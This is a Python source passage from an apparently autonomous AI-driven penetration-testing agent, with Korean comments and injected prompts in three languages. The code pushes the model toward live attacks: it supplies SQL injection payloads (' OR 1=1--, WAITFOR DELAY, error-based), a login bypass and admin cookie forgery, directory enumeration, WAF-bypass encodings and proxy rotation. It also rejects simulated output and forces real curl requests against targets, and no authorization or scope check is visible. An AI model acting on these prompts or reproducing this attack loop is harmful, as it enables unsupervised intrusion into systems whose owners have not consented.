            # CVE/버전 기반 exploit은 AI가 직접 판단해 tool_call로 실행하도록 위임

            # ── v3.5.22: Recon 모듈 자동 탐지 (세션당 1회만 출력) ───────────
            if _combined_out:
                try:
                    if not hasattr(self, '_recon_hints_shown'):
                        self._recon_hints_shown: set = set()
                    _rc_lower = _combined_out.lower()

                    _recon_checks = [
                        ("dom", ["subdomain", "subfinder", "amass", "crt.sh",
                                  "certificate transparency", "dns", "nslookup", "dig",
                                  "서브도메인", "域名", "子域"],
                         1, "recon_subdomain_hint",
                         "🔍 도메인 탐지 — /recon passive <domain>", "bold cyan"),
                        ("net", ["nmap", "masscan", "port scan", "open port", "shodan",
                                  "80/tcp", "443/tcp", "22/tcp", "포트스캔", "端口扫描"],
                         1, "recon_port_hint",
                         "🗺 포트/서비스 탐지 — /recon active <target>", "bold green"),
                        ("asset", ["asn", "bgpview", "fofa", "hunter.io", "email harvest",
                                    "asset", "attack surface", "자산", "资产", "攻击面"],
                         1, "recon_asset_hint",
                         "🗄 자산 탐지 — /recon full <domain>", "bold yellow"),
                        ("js", ["javascript", ".js", "api endpoint", "fetch(", "axios",
                                 "webpack", "bundle", "sourcemap", "endpoint", "api key",
                                 "apikey", "secret", "token"],
                         2, "recon_js_hint",
                         "📜 JS/API 탐지 — /recon js <url>", "bold magenta"),
                        ("nuclei", ["nuclei", "template", "cve-", "severity:", "critical",
                                     "vulnerability", "취약점", "漏洞"],
                         2, "recon_nuclei_hint",
                         "🧬 Nuclei 감지 — /recon nuclei <target>", "bold red"),
                    ]
                    for _rk, _kws, _min, _skey, _default, _style in _recon_checks:
                        if _rk not in self._recon_hints_shown:
                            if sum(1 for kw in _kws if kw in _rc_lower) >= _min:
                                _hint = self.s.get(_skey, _default)
                                self.console.print(f"[{_style}]{_hint}[/{_style}]")
                                self._recon_hints_shown.add(_rk)

                except Exception:
                    pass  # Recon 자동 탐지 오류는 실행 차단하지 않음



            _size_diff_pats = [
                # "34853 vs 34889" / "size=34853, inject=35117" 등
                r'(\d{4,})\s*[Bb]?\s*(?:vs|→|->|versus|normal[^\d]*)\s*(\d{4,})\s*[Bb]?',
                r'정상[=:\s]*(\d{4,})[Bb]?.{0,30}주입[=:\s]*(\d{4,})[Bb]?',
                r'normal[=:\s]*(\d{4,})[Bb]?.{0,50}inject[=:\s]*(\d{4,})[Bb]?',
                r'size.*?(\d{4,})\b.{0,60}size.*?(\d{4,})\b',
            ]
            _sqli_size_triggered = False
            for _szp in _size_diff_pats:
                _szm = _szr.search(_szp, _combined_out, _szr.IGNORECASE)
                if _szm:
                    try:
                        _sz_a, _sz_b = int(_szm.group(1)), int(_szm.group(2))
                        if abs(_sz_a - _sz_b) >= 100:
                            _sqli_size_triggered = True
                            break
                    except Exception:
                        pass
            if _sqli_size_triggered and not self._bruteforce_abort_triggered:
                _lang = getattr(self.config, "lang", "en")
                _size_warn = self.s.get("sqli_size_diff_detected", "")
                if _size_warn:
                    self.console.print(f"\n[bold green]{_size_warn}[/bold green]")
                # 타겟 메모리에 SQLi 포인트 자동 저장 시도
                _tgt = self._agent_state.get("target", "")
                if _tgt and self._tm_available:
                    try:
                        # 출력에서 파라미터와 URL 추출 시도
                        _url_m = _szr.search(r'https?://[^\s\'"]{10,}', _combined_out)
                        _param_m = _szr.search(r'(?:param(?:eter)?|파라미터)[=:\s]*([a-zA-Z_][a-zA-Z0-9_]{1,30})', _combined_out, _szr.I)
                        _found_url = _url_m.group(0) if _url_m else _tgt
                        _found_param = _param_m.group(1) if _param_m else "unknown"
                        # 크기 값 추출
                        _vals = _szr.findall(r'\b(\d{4,})\b', _combined_out)
                        _sz_n = int(_vals[0]) if len(_vals) >= 2 else None
                        _sz_i = int(_vals[1]) if len(_vals) >= 2 else None
                        self._tm_sqli(_tgt, _found_url, _found_param, "GET",
                                      _sz_n, _sz_i, "boolean/size-based")
                    except Exception:
                        pass
                _size_sqli_force_msg = {
                    "ko": (
                        "[⚡ 응답 크기 변화 → SQLi 강제 전환]\n\n"
                        "응답 크기 차이가 100B 이상 감지되었습니다 — 이는 매우 강력한 SQL Injection 신호입니다.\n\n"
                        "■ 즉시 다음을 수행하세요:\n"
                        "1. 해당 파라미터에 Boolean-based blind SQLi:\n"
                        "   정상: param=test  →  비교: param=test' AND 1=1--\n"
                        "2. Time-based blind SQLi (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
                        "4. 브루트포스나 다른 벡터는 이 SQLi를 완전히 검증한 후에 진행하세요.\n\n"
                        "지금 바로 SQLi 검증 코드를 작성하고 실행하세요."
                    ),
                    "zh": (
                        "[⚡ 响应大小差异 → 强制切换SQLi]\n\n"
                        "检测到响应大小差异≥100B — 这是非常强烈的SQL注入信号!\n\n"
                        "■ 立即执行:\n"
                        "1. Boolean-based blind SQLi: param=test' AND 1=1-- vs param=test' AND 1=2--\n"
                        "2. Time-based (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
                        "4. 在完全验证此SQLi之前，不要切换到暴力破解或其他向量!\n\n"
                        "现在立即编写并执行SQLi验证代码!"
                    ),
                    "en": (
                        "[⚡ RESPONSE SIZE DIFF → FORCING SQLi]\n\n"
                        "Response size difference ≥100B detected — this is a STRONG SQL injection signal.\n\n"
                        "■ DO THIS NOW:\n"
                        "1. Boolean-based blind SQLi: param=test' AND 1=1-- vs param=test' AND 1=2--\n"
                        "2. Time-based (MSSQL): param=test'; WAITFOR DELAY '0:0:3'--\n"
                        "3. Error-based: param=test' AND (SELECT 1/0)--\n"
                        "4. Do NOT switch to brute force or other vectors before confirming this SQLi!\n\n"
                        "Write and run SQLi confirmation code NOW."
                    ),
                }.get(_lang, "[⚡ SIZE DIFF → FORCE SQLi] Size difference detected. Run boolean/time-based SQLi NOW.")
                self.history.append(Message(role="user", content=f"[SIZE-BASED SQLi SIGNAL]\n{_size_sqli_force_msg}"))
                from ..models.registry import ModelRegistry as _MR_sz
                _mc_sz = self.config.get_active_model_config()
                if _mc_sz:
                    _m_sz = _MR_sz.build(_mc_sz)
                    _hint = self.s.get("sqli_size_force_hint", "⚡ SQLi 강제 전환 유도 중...")
                    self.console.print(f"\n[bold green]{_hint}[/bold green]")
                    current_response = self._stream_response(_m_sz.chat_stream(self._build_messages("")))
                    if current_response:
                        self.history.append(Message(role="assistant", content=current_response))
                    continue

            # ── v3.2.71-B: 브루트포스 자동 포기 + 벡터 전환 ──────────────────────
            # 증상: AI가 로그인 브루트포스를 수십 회 반복해도 성공 못 하고 계속 시도.
            # 탐지: 출력에 "로그인 실패 / login failed / 비밀번호 오류 / wrong password" 등
            #       연속 실패 키워드가 일정 횟수 이상 누적.
            # 처리: 임계값 초과 시 강제로 브루트포스 중단 + 다른 벡터로 전환 지시.
            _BF_FAIL_KEYWORDS = [
                r"(?:login|로그인).*?(?:fail|실패|오류|wrong|incorrect|denied|invalid)",
                r"(?:password|비밀번호).*?(?:wrong|틀|invalid|incorrect|fail)",
                r"(?:인증|auth).*?(?:실패|fail|error)",
                r"로그인\s*실패",
                r"비밀번호.*?(?:오류|틀림|불일치)",
                r"invalid\s+(?:credentials?|password|username)",
                r"authentication\s+fail",
            ]
            _bf_fail_count_cur = sum(
                1 for pat in _BF_FAIL_KEYWORDS
                if _szr.search(pat, _combined_out, _szr.IGNORECASE)
            )
            if _bf_fail_count_cur > 0:
                self._bruteforce_fail_count += _bf_fail_count_cur
            else:
                # 성공 키워드 있으면 카운터 리셋
                if _szr.search(r'(?:login|로그인).*?(?:success|성공|ok\b|200)', _combined_out, _szr.I):
                    self._bruteforce_fail_count = 0
            _BF_ABORT_THRESHOLD = 5  # 5회 누적 실패 → 자동 포기
            if (self._bruteforce_fail_count >= _BF_ABORT_THRESHOLD
                    and not self._bruteforce_abort_triggered):
                self._bruteforce_abort_triggered = True
                _lang = getattr(self.config, "lang", "en")
                _bf_abort_warn = self.s.get("bruteforce_abort_warn", "")
                if _bf_abort_warn:
                    self.console.print(f"\n[bold yellow]{_bf_abort_warn}[/bold yellow]")
                _bf_abort_msg = {
                    "ko": (
                        f"[🛑 브루트포스 자동 포기 — {self._bruteforce_fail_count}회 연속 실패]\n\n"
                        "더 이상의 브루트포스는 효율적이지 않습니다. 즉시 중단하고 다른 공격 벡터로 전환하세요.\n\n"
                        "■ 지금 시도해야 할 대안 공격벡터:\n"
                        "1. SQL Injection: 로그인 폼 파라미터에 SQLi 시도 (username=' OR 1=1--)\n"
                        "2. 사용자 열거: /join/checkId.do 등 가입 확인 API 재탐색\n"
                        "3. SQLi 포인트 재확인: 이전에 크기 차이가 발생했던 파라미터 집중 공격\n"
                        "4. 세션/쿠키 조작: admin 쿠키 강제 설정 후 관리자 패널 접근 시도\n"
                        "5. 디렉토리 열거: /admin, /manager, /backend 등\n\n"
                        "브루트포스는 완전히 포기하고 위 벡터 중 하나를 지금 즉시 시도하세요."
                    ),
                    "zh": (
                        f"[🛑 暴力破解自动放弃 — 已连续失败{self._bruteforce_fail_count}次]\n\n"
                        "继续暴力破解效率极低，立即停止并切换到其他攻击向量!\n\n"
                        "■ 现在尝试以下替代攻击向量:\n"
                        "1. SQL注入: 在登录表单参数尝试SQLi (username=' OR 1=1--)\n"
                        "2. 用户枚举: 重新探测注册/检查API\n"
                        "3. 重新攻击SQLi点: 集中攻击之前发现响应大小差异的参数\n"
                        "4. Session/Cookie操作: 强制设置admin cookie后访问管理面板\n"
                        "5. 目录枚举: /admin, /manager, /backend等\n\n"
                        "完全放弃暴力破解，立即尝试上述向量之一!"
                    ),
                    "en": (
                        f"[🛑 BRUTEFORCE AUTO-ABORT — {self._bruteforce_fail_count} consecutive failures]\n\n"
                        "Brute force is no longer efficient. STOP immediately and switch vectors.\n\n"
                        "■ Try these alternative attack vectors NOW:\n"
                        "1. SQL Injection on login form: username=' OR 1=1--\n"
                        "2. User enumeration: re-probe registration/check APIs\n"
                        "3. Re-attack SQLi points: focus on params with size differences\n"
                        "4. Session/Cookie manipulation: force admin cookie, access admin panel\n"
                        "5. Directory enumeration: /admin, /manager, /backend\n\n"
                        "ABANDON brute force completely. Pick one vector above and execute NOW."
                    ),
                }.get(_lang, "[🛑 BRUTEFORCE ABORTED] Switch to SQLi or other vectors now.")
                self.history.append(Message(role="user", content=f"[BRUTEFORCE ABORT]\n{_bf_abort_msg}"))
                from ..models.registry import ModelRegistry as _MR_bf
                _mc_bf = self.config.get_active_model_config()
                if _mc_bf:
                    _m_bf = _MR_bf.build(_mc_bf)
                    _bf_hint = self.s.get("bruteforce_redirect_hint", "🛑 브루트포스 중단 → 대안 벡터 전환 중...")
                    self.console.print(f"\n[bold yellow]{_bf_hint}[/bold yellow]")
                    current_response = self._stream_response(_m_bf.chat_stream(self._build_messages("")))
                    if current_response:
                        self.history.append(Message(role="assistant", content=current_response))
                    continue

            # ── SQLi 페이로드 에코 감지 (v3.2.70) ────────────────────────────
            # 증상: AI가 생성한 스크립트가 HTTP 응답에서 실제 데이터를 파싱하지 않고
            #       SQL 페이로드 문자열 자체를 "추출 결과"로 출력 → hex 커서 폭발로 이어짐.
            # 탐지: 출력에 SQL 페이로드 패턴('+CAST(, SELECT TOP, FROM sysobjects) 포함 시.
            import re as _sqe_re
            _SQL_ECHO_PATTERNS = [
                r"'\+CAST\s*\(",          # '+CAST((@@version) AS VARCHAR...)+'
                r"\+CAST\s*\(\s*\(",      # +CAST((SELECT ...
                r"SELECT\s+TOP\s+\d+\s+\w+\s+FROM\s+sys",   # SELECT TOP 1 name FROM sysobjects
                r"AS\s+VARCHAR\s*\(\s*\d+\s*\)\s*\)\+'",    # AS VARCHAR(8000))+'
                r"WHERE\s+xtype\s*=\s*0x55",                 # WHERE xtype=0x55
            ]
            _sqe_combined = "\n".join(results_text) if results_text else ""
            _sqe_detected = any(
                _sqe_re.search(p, _sqe_combined, _sqe_re.IGNORECASE)
                for p in _SQL_ECHO_PATTERNS
            )
            if _sqe_detected:
                _lang = getattr(self.config, "lang", "en")
                _sqe_warn = self.s.get("sqli_payload_echo_warn", "")
                if _sqe_warn:
                    self.console.print(f"\n[bold yellow]{_sqe_warn}[/bold yellow]")
                _sqe_fix_msg = {
                    "ko": (
                        "[⚠ SQLi 페이로드 에코 감지 — 응답 파싱 오류]\n\n"
                        "스크립트 출력에 SQL 페이로드 문자열이 그대로 포함됐습니다.\n"
                        "이는 서버 응답(HTML)에서 실제 주입된 데이터를 추출하지 못했음을 의미합니다.\n\n"
                        "■ 원인: re.search() 패턴이 실제 반사 위치와 불일치하거나 파싱 로직 없음\n"
                        "■ 해결: 아래 형식으로 응답 파싱 코드를 반드시 추가하세요:\n\n"
                        "```python\n"
                        "# HTML 응답에서 마커 사이의 실제 데이터 추출\n"
                        "import re\n"
                        "html = r.text  # 서버 실제 응답\n"
                        "# UNION 반사 위치를 먼저 확인: print(html[:3000])\n"
                        "m = re.search(r'<td[^>]*>([^<]{3,200})</td>', html)  # 반사 위치에 맞게 수정\n"
                        "if m:\n"
                        "    extracted = m.group(1).strip()\n"
                        "    # SQL 페이로드가 아닌지 검증\n"
                        "    if not re.search(r'CAST|SELECT|sysobjects', extracted, re.I):\n"
                        "        print(f'[+] 추출 성공: {extracted}')\n"
                        "        cursor_hex = extracted.encode('utf-8', errors='replace').hex()\n"
                        "    else:\n"
                        "        print('[!] 추출 실패: 반사 위치 재확인 필요')\n"
                        "```\n"
                        "hex 커서 사용 전 반드시 실제 데이터인지 확인하세요."
                    ),
                    "zh": (
                        "[⚠ 检测到SQLi载荷回显 — 响应解析错误]\n\n"
                        "脚本输出包含了原始SQL载荷字符串，而非服务器提取的实际数据。\n"
                        "这意味着脚本未能从HTTP响应HTML中正确解析反射位置。\n\n"
                        "■ 原因: re.search()模式与实际反射位置不匹配或缺少解析逻辑\n"
                        "■ 解决: 必须添加以下响应解析代码:\n\n"
                        "```python\n"
                        "import re\n"
                        "html = r.text\n"
                        "# 先打印响应确认反射位置: print(html[:3000])\n"
                        "m = re.search(r'<td[^>]*>([^<]{3,200})</td>', html)  # 按实际位置修改\n"
                        "if m:\n"
                        "    extracted = m.group(1).strip()\n"
                        "    if not re.search(r'CAST|SELECT|sysobjects', extracted, re.I):\n"
                        "        print(f'[+] 提取成功: {extracted}')\n"
                        "        cursor_hex = extracted.encode('utf-8', errors='replace').hex()\n"
                        "    else:\n"
                        "        print('[!] 提取失败: 需重新确认反射位置')\n"
                        "```"
                    ),
                    "en": (
                        "[⚠ SQLi PAYLOAD ECHO DETECTED — RESPONSE PARSING FAILURE]\n\n"
                        "Script output contains raw SQL payload strings instead of actual server data.\n"
                        "The script failed to parse the real injected value from the HTTP response HTML.\n\n"
                        "■ Cause: re.search() pattern does not match actual reflection point in HTML\n"
                        "■ Fix: Add response parsing before hex-encoding the cursor:\n\n"
                        "```python\n"
                        "import re\n"
                        "html = r.text\n"
                        "# First: print(html[:3000]) to find the actual reflection position\n"
                        "m = re.search(r'<td[^>]*>([^<]{3,200})</td>', html)  # adjust to match\n"
                        "if m:\n"
                        "    extracted = m.group(1).strip()\n"
                        "    if not re.search(r'CAST|SELECT|sysobjects', extracted, re.I):\n"
                        "        print(f'[+] Extracted: {extracted}')\n"
                        "        cursor_hex = extracted.encode('utf-8', errors='replace').hex()\n"
                        "    else:\n"
                        "        print('[!] Extraction failed: reflection position mismatch')\n"
                        "```\n"
                        "NEVER hex-encode a value before validating it is real extracted data."
                    ),
                }.get(_lang, (
                    "[⚠ SQLi PAYLOAD ECHO] Script printed SQL payload instead of extracted data. "
                    "Fix response parsing: m = re.search(r'<marker>(.+?)</marker>', html); use m.group(1)."
                ))
                self.history.append(Message(role="user", content=f"[EXECUTION RESULT — SQLi PARSE ERROR]\n{_sqe_fix_msg}"))
                from ..models.registry import ModelRegistry as _MR_sqe
                _mc_sqe = self.config.get_active_model_config()
                if not _mc_sqe:
                    break
                _m_sqe = _MR_sqe.build(_mc_sqe)
                self.console.print(
                    f"\n[bold yellow]{self.s.get('sqli_reparse_hint', '⚡ SQLi 파싱 재시도 유도 중...')}[/bold yellow]"
                )
                current_response = self._stream_response(_m_sqe.chat_stream(self._build_messages("")))
                if current_response:
                    self.history.append(Message(role="assistant", content=current_response))
                continue

            # ── v3.2.73: 코드 출력 내 模拟渗透 감지 ─────────────────────────
            # 코드 실행은 됐지만 출력이 "모의 결과"임을 스스로 표시한 경우.
            # 예: "[模拟结果] 发现SQL注入", "시뮬레이션 완료: admin계정 발견"
            _SIM_OUTPUT_KWS = [
                r"(?:模拟|模拟测试|模拟执行|模拟渗透|模拟结果|模拟探测)\s*[:：]",
                r"\[?\s*(?:Simulated?\s*(?:Result|Output|Response|Attack|Test)|MOCK\s*RESULT)\s*\]?",
                r"(?:假设|假设服务器|假设结果|假设响应)\s*[:：]",
                r"(?:시뮬레이션|가상\s*실행|모의\s*결과|모의\s*실행)\s*[:：\[]",
                r"# (?:这是模拟|这只是模拟|模拟HTTP|simulate)",
                r"\[?(?:SIMULATED|MOCK|FAKE)\s+(?:RESULT|RESPONSE|OUTPUT)\]?",
                r"(?:结果仅供参考|以下为模拟|以下是模拟|实际环境.*?可能.*?不同)",
            ]
            import re as _sim_re
            _sim_out_combined = "\n".join(results_text) if results_text else ""
            _sim_output_detected = results_text and any(
                _sim_re.search(p, _sim_out_combined, _sim_re.IGNORECASE)
                for p in _SIM_OUTPUT_KWS
            )
            if _sim_output_detected:
                _lang = getattr(self.config, "lang", "en")
                _sim_warn_ui = self.s.get("simulated_output_intercepted", "⛔ 모의 침투 출력 감지 — 실제 HTTP 실행 강제")
                self.console.print(f"\n[bold red]{_sim_warn_ui}[/bold red]")
                _sim_force_msg = {
                    "ko": (
                        "[⛔ 모의 침투 출력 감지 — BINGO 런타임 차단]\n\n"
                        "스크립트 출력에 '模拟结果', '가상 실행', '시뮬레이션' 등 모의/가상 결과 표시가 포함됐습니다.\n"
                        "이는 실제 HTTP 요청 없이 결과를 날조한 것입니다.\n\n"
                        "■ 절대 금지:\n"
                        "  - 모의 응답 dict/string 하드코딩 후 '발견' 주장\n"
                        "  - '# 실제 네트워크 없어서 가상 결과' 주석 사용\n"
                        "  - print('[模拟] ...') 형태의 가짜 결과 출력\n\n"
                        "■ 지금 즉시:\n"
                        "  ```bash\n"
                        "  curl -sk -m 30 -D - 'https://TARGET/경로' | python3 -c 'import sys; r=sys.stdin.read(); print(r[:500])'\n"
                        "  ```\n"
                        "  위 bash+curl 명령으로 실제 서버 응답을 받아 분석하세요.\n"
                        "  bingo는 완전한 인터넷 연결 환경에서 실행됩니다."
                    ),
                    "zh": (
                        "[⛔ 检测到模拟渗透输出 — BINGO运行时已拦截]\n\n"
                        "脚本输出包含'模拟结果'/'模拟执行'等模拟标记，说明代码未发送真实HTTP请求。\n\n"
                        "■ 绝对禁止:\n"
                        "  - 硬编码假响应dict然后声称发现漏洞\n"
                        "  - 使用'# 模拟结果'注释\n"
                        "  - print('[模拟]...')输出虚假结果\n\n"
                        "■ 立即执行:\n"
                        "  ```bash\n"
                        "  curl -sk -m 30 -D - 'https://TARGET/路径' | python3 -c 'import sys; r=sys.stdin.read(); print(r[:500])'\n"
                        "  ```\n"
                        "  bingo在真实网络环境中运行，必须使用bash+curl发送真实HTTP请求!"
                    ),
                    "en": (
                        "[⛔ SIMULATED OUTPUT INTERCEPTED — BINGO RUNTIME BLOCKED]\n\n"
                        "Script output contains simulation markers ('Simulated Result', '模拟结果', etc.).\n"
                        "This means the code fabricated results WITHOUT real HTTP requests.\n\n"
                        "■ ABSOLUTELY FORBIDDEN:\n"
                        "  - Hardcoding fake response dicts then claiming 'found vulnerability'\n"
                        "  - Using '# simulate/模拟' comment blocks\n"
                        "  - print('[SIMULATED]...') fake output\n\n"
                        "■ DO THIS NOW:\n"
                        "  ```bash\n"
                        "  curl -sk -m 30 -D - 'https://TARGET/real-path' | python3 -c 'import sys; r=sys.stdin.read(); print(r[:500])'\n"
                        "  ```\n"
                        "  bingo runs in a REAL network environment. Use REAL bash+curl commands!"
                    ),
                }.get(_lang, "[⛔ SIMULATED OUTPUT] Remove hardcoded fake results. Use bash+curl for real HTTP.")
                self.history.append(Message(role="user", content=f"[SIMULATED_OUTPUT_BLOCKED]\n{_sim_force_msg}"))
                from ..models.registry import ModelRegistry as _MR_sim
                _mc_sim = self.config.get_active_model_config()
                if _mc_sim:
                    _m_sim = _MR_sim.build(_mc_sim)
                    self.console.print(f"\n[bold red]{self.s.get('simulated_output_retrying', '⛔ 모의실행 차단 → 실제 HTTP 코드 재요청 중...')}[/bold red]")
                    current_response = self._stream_response(_m_sim.chat_stream(self._build_messages("")))
                    if current_response:
                        self.history.append(Message(role="assistant", content=current_response))
                    continue

            # ── 환각 감지 (HTTP 응답 지표 없는 출력) ─────────────────────────
            _real_http_indicators = [
                "200", "201", "301", "302", "400", "401", "403", "404", "500",
                "HTTP/", "Content-", "text/html", "application/json",
                "Server:", "Set-Cookie", "Location:", "charset",
                "status_code", "STATUS", "<!DOCTYPE", "<html",
            ]
            def _has_real_http_output(outputs: list[str]) -> bool:
                combined = " ".join(outputs).lower()
                return any(ind.lower() in combined for ind in _real_http_indicators)

            if results_text:
                # 환각 차단 메시지 포함됐을 때 (JSON 코드블록)
                _is_all_hallucination_blocks = all(
                    "HALLUCINATION DETECTED" in r or "ALL CODE BLOCKS REJECTED" in r
                    for r in results_text
                )
                # 실제 HTTP 출력 전혀 없고 결과가 너무 짧음
                _all_very_short = all(len(r.strip()) < 200 for r in results_text)
                _no_real_http = not _has_real_http_output(results_text)

                if _is_all_hallucination_blocks or (_all_very_short and _no_real_http):
                    _lang = getattr(self.config, "lang", "en")
                    _force_rewrite = {
                        "ko": (
                            "[⛔ 환각 코드 감지 — 즉시 재작성 필요]\n"
                            "작성한 코드에서 실제 HTTP 응답이 없습니다.\n"
                            "반드시 아래 형식으로 bash 블록을 다시 작성하세요:\n\n"
                            "```bash\n"
                            "curl -sk -m 30 -D - 'https://TARGET/실제경로' \\\n"
                            "  -H 'User-Agent: Mozilla/5.0' \\\n"
                            "  | python3 -c 'import sys; r=sys.stdin.read(); print(\"[STATUS] 200\"); print(r[:500])'\n"
                            "```\n"
                            "JSON 딕셔너리({...})나 가짜 출력은 절대 사용 금지."
                        ),
                        "zh": (
                            "[⛔ 检测到幻觉代码 — 必须立即重写]\n"
                            "您的代码没有产生真实的HTTP响应。\n"
                            "必须按以下bash+curl格式重写所有代码块:\n\n"
                            "```bash\n"
                            "curl -sk -m 30 -D - 'https://TARGET/真实路径' \\\n"
                            "  -H 'User-Agent: Mozilla/5.0' \\\n"
                            "  | python3 -c 'import sys; r=sys.stdin.read(); print(r[:500])'\n"
                            "```\n"
                            "禁止使用JSON字典({...})或伪造输出。"
                        ),
                        "en": (
                            "[⛔ HALLUCINATION CODE DETECTED — REWRITE REQUIRED]\n"
                            "Your code produced NO real HTTP responses.\n"
                            "You MUST rewrite ALL code blocks as bash+curl like this:\n\n"
                            "```bash\n"
                            "curl -sk -m 30 -D - 'https://TARGET/real-path' \\\n"
                            "  -H 'User-Agent: Mozilla/5.0' \\\n"
                            "  | python3 -c 'import sys; r=sys.stdin.read(); print(r[:500])'\n"
                            "```\n"
                            "FORBIDDEN: JSON dicts ({...}), fake output, simulation code."
                        ),
                    }.get(_lang, "Rewrite with real bash+curl commands NOW.")
                    self.history.append(Message(role="user", content=_force_rewrite))
                    from ..models.registry import ModelRegistry as _MR_hall
                    _mc_hall = self.config.get_active_model_config()
                    if not _mc_hall:
                        break
                    _m_hall = _MR_hall.build(_mc_hall)
                    current_response = self._stream_response(_m_hall.chat_stream(self._build_messages("")))
                    if current_response:
                        self.history.append(Message(role="assistant", content=current_response))
                    continue

            if not results_text:
                # 코드 블록은 있었지만 실행 결과 없음 → AI에게 알리고 계속
                _lang = getattr(self.config, "lang", "en")
                _no_output_msg = {
                    "ko": (
                        "[⛔ 스크립트 출력 없음 — 환각 코드 의심]\n"
                        "스크립트가 실행됐지만 출력이 없습니다. "
                        "bash 블록에 실제 curl HTTP 요청이 없거나 echo만 있습니다.\n"
                        "반드시 curl -sk -m 30 'URL' 을 호출하고 파이프로 출력을 확인하세요."
                    ),
                    "zh": (
                        "[⛔ 脚本无输出 — 疑似幻觉代码]\n"
                        "脚本执行但没有输出。bash块中缺少真实curl HTTP请求或只包含echo。\n"
                        "必须使用curl -sk -m 30 'URL' 并通过管道查看输出。"
                    ),
                    "en": (
                        "[⛔ SCRIPT NO OUTPUT — HALLUCINATION SUSPECTED]\n"
                        "Script ran but produced ZERO output. "
                        "Your bash block has no real curl HTTP calls or contains only echo.\n"
                        "Add: curl -sk -m 30 'URL' | python3 -c 'import sys; print(sys.stdin.read()[:300])'"
                    ),
                }.get(_lang, "Script produced no output. Add curl -sk -m 30 'URL' to the bash block.")
                self.history.append(Message(role="user", content=f"[EXECUTION RESULT]\n{_no_output_msg}"))
                model_cfg2 = self.config.get_active_model_config()
                if not model_cfg2:
                    break
                from ..models.registry import ModelRegistry as _MR2
                _m2 = _MR2.build(model_cfg2)
                current_response = self._stream_response(_m2.chat_stream(self._build_messages("")))
                if current_response:
                    self.history.append(Message(role="assistant", content=current_response))
                continue

            # 롤백 스냅샷
            self._rollback.save(
                agent_state=self._agent_state,
                history_len=len(self.history),
                label=f"Loop #{self._exec_loop_count} — {(self._agent_state.get('target') or '?')[:40]}",
            )

            # 결과 압축 (컨텍스트 폭발 방지)
            raw_results = "\n".join(results_text)
            # /retry 를 위해 마지막 실행 결과 보존
            self._last_exec_result = raw_results

            # ── v4.8.0: 실행 결과 후처리 — 빈값 [VERIFIED] + SLEEP 판정 오류 감지 ──
            raw_results = self._postcheck_exec_output(raw_results)

            # ── v3.2.96: 실시간 발견 자동 저장 + XSS Playwright 자동 검증 ──
            self._auto_analyze_findings(
                raw_results,
                current_response[:16_384],
                execution_context=getattr(self, "_last_execution_context", None),
            )
            verification_context = self._verification_backlog_context()
            adaptive_pivot_context = self._adaptive_attack_pivot_context(
                current_response, raw_results
            )
            if len(raw_results) > 3000:
                trimmed = (
                    raw_results[:1500]
                    + f"\n\n[... {len(raw_results) - 3000} chars trimmed ...]\n\n"
                    + raw_results[-1500:]
                )
            else:
                trimmed = raw_results

            # 히스토리 슬라이딩 윈도우
            non_system = [m for m in self.history if m.role != "system"]
            if len(non_system) > 20:
                system_msgs = [m for m in self.history if m.role == "system"]
                self.history = system_msgs + non_system[-16:]

            self._parse_agent_state(raw_results)
            state_summary = self._format_agent_state() if hasattr(self, "_format_agent_state") else ""
            state_summary += verification_context + adaptive_pivot_context
            # v3.2.74: 프록시 상태를 state_summary에 포함
            if self._proxy.enabled:
                _pe = self._proxy.current()
                if _pe:
                    state_summary += (
                        f"\n[PROXY_ACTIVE: {_pe}]\n"
                        f"import urllib3; urllib3.disable_warnings()\n"
                        f"PROXIES = {{'http': '{_pe.url}', 'https': '{_pe.url}'}}\n"
                        f"sess = __import__('requests').Session(); sess.trust_env = False\n"
                        f"r = sess.get(url, proxies=PROXIES, verify=False, timeout=15)\n"
                    )
            # ── v6.2.159 Task Graph + SubAgent 상태를 state_summary에 포함 ──
            if getattr(self, "_intel_ready", False):
                try:
                    _tg_next = self._task_graph.next_hint()
                    if _tg_next:
                        state_summary += f"\n{_tg_next}"
                    _sa_status = self._subagent_pool.build_status_msg()
                    if _sa_status:
                        state_summary += f"\n{_sa_status}"
                except Exception:
                    pass
            # ─────────────────────────────────────────────────────────────────
            self._show_token_usage()
            self._exec_loop_count += 1

            # ── v6.2.151 Doom Loop 감지기 (Type A) ───────────────────────────
            # 연속 동일 응답 패턴 감지 → 전략 전환 힌트 자동 주입
            # 조건: 최근 6개 시그니처 중 4개 이상 동일 → doom loop 탈출 힌트 주입
            import hashlib as _dl_md5
            _dl_sig = _dl_md5.md5(
                (current_response or "")[:200].encode()
            ).hexdigest()[:12]
            self._dl_tool_sigs.append(_dl_sig)
            if len(self._dl_tool_sigs) > 12:
                self._dl_tool_sigs = self._dl_tool_sigs[-12:]
            _dl_window = self._dl_tool_sigs[-6:] if len(self._dl_tool_sigs) >= 6 else []
            _dl_doom_detected = len(_dl_window) >= 6 and (
                max(_dl_window.count(s) for s in set(_dl_window)) >= 4
            )
            # HTTP 200/found 같은 일반 문구가 반복을 영구 리셋하지 않도록
            # 검증된 신규 증거만 진행으로 인정한다.
            _dl_has_progress = self._has_meaningful_loop_progress(raw_results)
            if _dl_has_progress:
                _dl_progress_sig = self._meaningful_loop_progress_signature(raw_results)
                if _dl_progress_sig and _dl_progress_sig in self._dl_progress_sigs:
                    _dl_has_progress = False
                elif _dl_progress_sig:
                    self._dl_progress_sigs.add(_dl_progress_sig)
            if not _dl_has_progress:
                self._dl_no_progress += 1
            else:
                self._dl_escape_attempts = 0
                if self._dl_no_progress > 0:
                    _progress_msg = self.s.get(
                        "doom_progress_autocorrected",
                        "Auto-corrected: new reconnaissance evidence resets the no-progress counter",
                    )
                    self.console.print(f"[{THEME['success']}]{_progress_msg}[/]")
                self._dl_no_progress = 0
            if _dl_doom_detected or self._dl_no_progress >= 8:
                from ..i18n import t as _t_dl, get_lang as _gl_dl
                _dl_escape_map = {
                    "ko": (
                        "⚠️ [DOOM_LOOP] 반복 패턴 감지됨 — 전략을 바꿔야 합니다.\n"
                        "다음 중 하나를 시도하세요:\n"
                        "1) 다른 파라미터/엔드포인트로 전환\n"
                        "2) WAF 우회 페이로드 교체 (인코딩 변경)\n"
                        "3) 다른 취약점 유형으로 전환 (XSS→LFI 등)\n"
                        "4) 프록시 교체 후 재시도\n"
                        "즉시 전략을 바꿔서 계속하세요."
                    ),
                    "zh": (
